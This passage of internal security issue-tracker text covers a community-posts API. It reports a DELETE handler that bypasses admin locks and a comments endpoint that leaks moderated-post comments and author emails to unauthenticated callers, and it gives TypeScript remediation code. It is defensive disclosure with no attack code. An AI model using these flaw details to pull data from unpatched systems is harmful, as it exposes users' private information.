PR [logi-x/experts#792](https://linear.app/experts/review/fixcommunity-admin-moderation-oomerror-hardening-on-post-detail-linear-893fe7fa30cf) ([EXP-280](https://linear.app/experts/issue/EXP-280/security-community-post-put-allows-owner-to-reverse-admin-unpublish)) added `adminLockedAt` to the `Post` model and enforces it in the `PUT` handler and thumbnail upload route. The `DELETE` handler was not updated in the same PR. An owner blocked from editing a locked post via `PUT` (403) can instead delete the post entirely, achieving the same content-removal outcome while destroying the moderation audit trail.

## Suggested fix

```typescript
const post = await prisma.post.findUnique({
  where: {id},
  select: {userId: true, adminLockedAt: true},
});
// after ownership check:
if (post.adminLockedAt != null && !isAdmin) {
  return NextResponse.json(
    {error: "Content has been administratively restricted"},
    {status: 403},
  );
}
```

## Related prior issues

[EXP-277](https://linear.app/experts/issue/EXP-277/bug-community-posts-delete-has-no-admin-bypass-admin-moderation-and) (resolved — same symbol DELETE, prior class: missing admin bypass, merged PR [logi-x/experts#792](https://linear.app/experts/review/fixcommunity-admin-moderation-oomerror-hardening-on-post-detail-linear-893fe7fa30cf))

Title: [security] GET /posts/{id}/comments has no post visibility check — moderated-post comments exposed
Description:
## Severity

Medium (P3)

## Summary

`GET /api/v1/community/posts/{id}/comments` returns the full comment thread for any post UUID with no check that the parent post is published or accessible to the requester. The post-detail route (`posts/[id]/route.ts GET`) was fixed ([EXP-254](https://linear.app/experts/issue/EXP-254/security-get-communitypostsid-returns-draft-posts-missing-ispublished)) with a `visibilityClause` that 404s draft/admin-unpublished posts for non-owners, but this fix was never extended to the comments endpoint.

## Attacker → Input → Reach → Impact

* **Attacker**: Unauthenticated caller who knows a post UUID (discoverable via the realtime `item_added` feed event before the post is moderated — same vector as [EXP-254](https://linear.app/experts/issue/EXP-254/security-get-communitypostsid-returns-draft-posts-missing-ispublished))
* **Input**: `postId` path parameter (UUID-validated; non-UUID returns 400)
* **Reach**: `apps/experts-app/app/api/v1/community/posts/[id]/comments/route.ts:GET` → `prisma.comment.findMany({where: {postId}})` — no `Post.isPublished` join, no ownership check, no admin bypass
* **Impact**: Full comment thread for an admin-unpublished/moderated post is returned to any unauthenticated caller who knows the UUID. Content includes comment bodies, author emails, and timestamps — amplifying [EXP-294](https://linear.app/experts/issue/EXP-294/security-community-comment-and-post-author-email-exposed-to). The post body itself is protected by the [EXP-254](https://linear.app/experts/issue/EXP-254/security-get-communitypostsid-returns-draft-posts-missing-ispublished) fix on the post-detail route, but comments are a separate data class.

## Cache invalidation gap (secondary, amplifies primary)

`apps/experts-app/app/api/v1/community/posts/[id]/route.ts` PUT handler (the admin unpublish path) calls:

* `postsCache.invalidate(id)` ✓
* **Missing**: `commentsCache.invalidatePostAndComments(id)` ✗

After an admin moderates a post, the comments cache for that post remains warm for up to 5 minutes (300 s TTL). Any unauthenticated caller is served the cached comments directly — the cache short-circuit in the GET handler fires before any possible post-visibility check would run.

## Secondary finding folded in: POST /comments no publication check (FP `c78d703bcc3e`)

`POST /api/v1/community/posts/{id}/comments` (authenticated) does not verify the post is published/accessible before writing a comment. An authenticated caller with a moderated post UUID can create comments on it (FK is satisfied since the post row still exists). Those comments surface through the primary GET leak. Standalone severity is low; fix belongs in the same PR as the GET remediation.

## Recommended remediation

1. **GET handler** — before the cache read and before the DB query, add a post-visibility lookup mirroring `posts/[id]/route.ts`:

   ```ts
   const post = await prisma.post.findFirst({where: {id: postId, ...visibilityClause}});
   if (!post) return NextResponse.json({error: "Post not found"}, {status: 404});
   ```
2. **Cache invalidation** — add `commentsCache.invalidatePostAndComments(id)` to the admin unpublish path in `posts/[id]/route.ts` PUT.
3. **POST handler** — add the same post-visibility check before `prisma.comment.create`.

## Related prior issues

Related prior issues: [EXP-289](https://linear.app/experts/issue/EXP-289/security-community-comments-get-unbounded-findmany-with-no-cache-read) (resolved — unbounded findMany on same GET handler), [EXP-294](https://linear.app/experts/issue/EXP-294/security-community-comment-and-post-author-email-exposed-to) (open — author email PII in same GET response payload)

## Verified by

security-auditor (primary), architecture-reviewer (verifier)
